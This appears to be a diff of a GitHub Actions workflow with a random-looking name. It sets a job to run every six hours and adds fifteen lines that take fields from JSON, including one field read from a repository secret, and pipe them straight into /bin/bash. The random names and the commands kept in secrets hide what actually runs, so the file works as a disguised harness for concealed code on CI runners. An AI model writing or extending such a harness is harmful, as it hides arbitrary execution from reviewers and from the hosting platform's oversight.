@@ -1,24 +1,31 @@
 name: qiyufeng3718
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 4/6 * * *'
+    - cron: '36 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qiyufeng3718
         env:
-          ygvlv5: ${{ secrets.ygvlv5 }}
+          v536: ${{ secrets.v536 }}
         run: |
-          echo $ygvlv5 | jq -r .nocz0 | /bin/bash
-          echo $v90152 | jq -r .dmw5299 | /bin/bash
-          echo $ymxfo27937 | jq -r .eamt88 | /bin/bash
-          echo $z0 | jq -r .l86433 | /bin/bash
-          echo $w39 | jq -r .knwkn9 | /bin/bash
-          echo $vfsot1 | jq -r .tgi2 | /bin/bash
-          echo $t4855 | jq -r .ylfqi22 | /bin/bash
+          echo $v536 | jq -r .qth84 | /bin/bash
+          echo $a36 | jq -r .knb7 | /bin/bash
+          echo $nidbv5582 | jq -r .bpfkf0 | /bin/bash
+          echo $dc02228 | jq -r .xvbt249 | /bin/bash
+          echo $a790 | jq -r .oaq508 | /bin/bash
+          echo $we9186 | jq -r .ggqp834 | /bin/bash
+          echo $wab231 | jq -r .dw7505 | /bin/bash
+          echo $rexnc96639 | jq -r .a3 | /bin/bash
+          echo $enqm38193 | jq -r .mls69190 | /bin/bash
+          echo $kmhta4381 | jq -r .cdfzm71818 | /bin/bash
+          echo $gsmg21 | jq -r .u39163 | /bin/bash
+          echo $hm92723 | jq -r .g3 | /bin/bash
+          echo $guz9094 | jq -r .lcnij1222 | /bin/bash
+          echo $yar2 | jq -r .qp327 | /bin/bash
+          echo $wdyzx5 | jq -r .uut6255 | /bin/bash
 
